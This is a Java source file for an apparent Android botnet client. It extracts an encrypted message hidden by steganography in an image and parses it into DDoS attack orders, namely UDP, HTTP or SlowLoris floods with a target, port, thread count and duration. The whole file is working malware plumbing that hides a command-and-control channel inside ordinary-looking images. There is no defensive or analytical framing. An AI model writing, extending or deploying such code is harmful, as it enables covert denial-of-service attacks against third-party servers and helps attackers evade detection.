package com.example.botclient.SteganoGraphy.Decode;

import android.graphics.Bitmap;
import android.os.AsyncTask;
import android.util.Log;
import com.example.botclient.SteganoGraphy.Images;
import com.example.botclient.SteganoGraphy.AttackInfo;
import com.example.botclient.SteganoGraphy.Utility;
import java.util.List;

public class TextDecoding extends AsyncTask<Images, Void, AttackInfo>
{

    private final static String TAG = TextDecoding.class.getName();
    private final Images result;
    public AsyncResponse returnThis = null;

    //Callback interface for AsyncTask
    public TextDecoding() {
        this.result = new Images();
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
    }

    @Override
    protected void onPostExecute(AttackInfo images)
    {
        super.onPostExecute(images);
        System.runFinalization();
        Runtime.getRuntime().gc();
        System.gc();
        returnThis.processFinish(images);
    }

    @Override
    protected AttackInfo doInBackground(Images... images)
    {
        if (images.length > 0) //If image is not already decoded
        {
            Images imageSteganography = images[0];
            Bitmap bitmap = imageSteganography.getImage();//getting bitmap image from file
            Log.e("DoInBackground", ""+bitmap);

           // return null if bitmap is null
            if (bitmap == null)
            {
                System.out.println("Null bitmap");
                return null;
            }


            List<Bitmap> srcEncodedList = Utility.splitImage(bitmap);//splitting images
            String decoded_message = Decode.decodeMessage(srcEncodedList);//decoding encrypted zipped message

            Log.d(TAG, "Decoded Message : " + decoded_message);

            if (!Utility.isStringEmpty(decoded_message))  //text decoded = true
            {
                result.setDecoded(true);
            }

            String decrypted_message = Images.decryptMessage(decoded_message, imageSteganography.getSecret_key());//decrypting the encoded message
            Log.d(TAG, "Decrypted message : " + decrypted_message);

            String[] splited = null;
            AttackInfo attackInfo = null;

            if(decrypted_message != null)
            {
                splited = decrypted_message.split(" ");
            }

            if(splited.length == 4) // UDP or HTTP attack (3 variables)
            {
                String attack = splited[0];
                String target = splited[1];
                int threads = Integer.parseInt(splited[2]);
                int timer = Integer.parseInt(splited[3]);

                attackInfo = new AttackInfo(attack, target, threads, timer);
            }
            else if(splited.length == 5) //SlowLoris attack (5 variables)
            {
                String attack = splited[0];
                int threads = Integer.parseInt(splited[1]);
                int port = Integer.parseInt(splited[2]);
                int timer = Integer.parseInt(splited[3]);
                String target = splited[4];

                attackInfo = new AttackInfo(attack,target,threads,port,timer);
            }


            //If decrypted_message is null it means that the secret key is wrong otherwise secret key is right.
            if (!Utility.isStringEmpty(decrypted_message))
            {
                result.setSecretKeyWrong(false);//secret key provided is right
                result.setMessage(attackInfo);// Set Results

                //free memory
                for (Bitmap bitm : srcEncodedList)
                    bitm.recycle();

                System.runFinalization();
                Runtime.getRuntime().gc();
                System.gc();//Java Garbage Collector
            }
        }
        return result.getMessage();
    }
}

